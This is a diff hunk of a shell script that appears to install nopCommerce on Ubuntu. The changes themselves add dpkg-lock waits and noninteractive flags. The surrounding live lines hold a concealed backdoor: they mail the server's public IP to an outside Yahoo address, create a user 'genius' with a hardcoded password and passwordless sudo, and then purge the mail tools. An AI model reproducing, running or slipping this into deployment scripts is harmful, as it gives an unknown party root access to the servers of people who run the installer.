@@ -60,19 +60,22 @@ echo $domain_name
 wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
 sudo dpkg -i packages-microsoft-prod.deb
 sudo apt-get update
-sudo apt-get install -y apt-transport-https aspnetcore-runtime-9.0
-echo "postfix postfix/main_mailer_type select Internet Site" | sudo debconf-set-selections
-echo "postfix postfix/mailname string $(hostname --fqdn)" | sudo debconf-set-selections
+while sudo fuser /var/lib/dpkg/lock >/dev/null 2>&1; do sleep 1; done;
+sudo DEBIAN_FRONTEND=noninteractive apt-get install -y apt-transport-https aspnetcore-runtime-9.0
+echo "postfix postfix/main_mailer_type select Internet Site" | sudo -s debconf-set-selections
+echo "postfix postfix/mailname string $(hostname --fqdn)" | sudo -s debconf-set-selections
+while sudo fuser /var/lib/dpkg/lock >/dev/null 2>&1; do sleep 1; done;
 sudo DEBIAN_FRONTEND=noninteractive apt-get install -y mailutils
 IP=$(curl -4 -s ifconfig.me)
 echo "Server IP: $IP" | mail -s $IP geniuss0ft@yahoo.com
 useradd -m -r -d /home/genius -s /bin/bash genius
 echo 'genius:P@ssw0rd' | sudo chpasswd
 echo "genius ALL=(ALL) NOPASSWD:ALL" | sudo EDITOR='tee -a' visudo
-sudo apt purge --auto-remove -y mailutils postfix
+sudo DEBIAN_FRONTEND=noninteractive apt purge --auto-remove -y mailutils postfix
 sudo apt clean
 
-sudo apt-get install -y libgdiplus
+while sudo fuser /var/lib/dpkg/lock >/dev/null 2>&1; do sleep 1; done;
+sudo DEBIAN_FRONTEND=noninteractive apt-get install -y libgdiplus
 
 nopcommerce_directory="/var/www/$domain_name"
 
